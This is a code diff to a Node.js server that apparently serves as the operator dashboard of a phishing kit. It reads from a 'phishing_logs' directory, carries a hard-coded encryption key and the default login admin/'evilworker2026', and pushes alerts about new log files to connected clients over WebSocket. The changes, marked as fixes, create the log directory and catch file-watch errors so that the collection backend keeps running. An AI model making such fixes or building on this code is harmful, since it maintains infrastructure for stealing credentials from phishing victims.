@@ -11,6 +11,13 @@ const PORT = process.env.PORT || 3001;
 const LOG_DIR = './phishing_logs';
 const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y';
 
+// =============================================
+// ✅ FIX: Ensure logs directory exists
+// =============================================
+if (!fs.existsSync(LOG_DIR)) {
+    fs.mkdirSync(LOG_DIR, { recursive: true });
+}
+
 // Password protect dashboard (set env DASHBOARD_USER / DASHBOARD_PASS)
 const user = process.env.DASHBOARD_USER || 'admin';
 const pass = process.env.DASHBOARD_PASS || 'evilworker2026';
@@ -119,16 +126,19 @@ wss.on('connection', (ws) => {
     });
 });
 
-// Watch log directory for changes (new files)
-fs.watch(LOG_DIR, (eventType, filename) => {
-    if (filename && filename.endsWith('.log')) {
-        // Notify all connected clients
-        clients.forEach(client => {
-            if (client.readyState === WebSocket.OPEN) {
-                client.send(JSON.stringify({ type: 'newLog', file: filename }));
-            }
-        });
-    }
-});
-
-// Also send initial list on connect? We'll rely on client fetch.
+// =============================================
+// ✅ FIX: Gracefully handle file watch errors
+// =============================================
+try {
+    fs.watch(LOG_DIR, (eventType, filename) => {
+        if (filename && filename.endsWith('.log')) {
+            clients.forEach(client => {
+                if (client.readyState === WebSocket.OPEN) {
+                    client.send(JSON.stringify({ type: 'newLog', file: filename }));
+                }
+            });
+        }
+    });
+} catch (err) {
+    console.warn('⚠️ File watching not available on this platform. Frontend will poll.');
+}
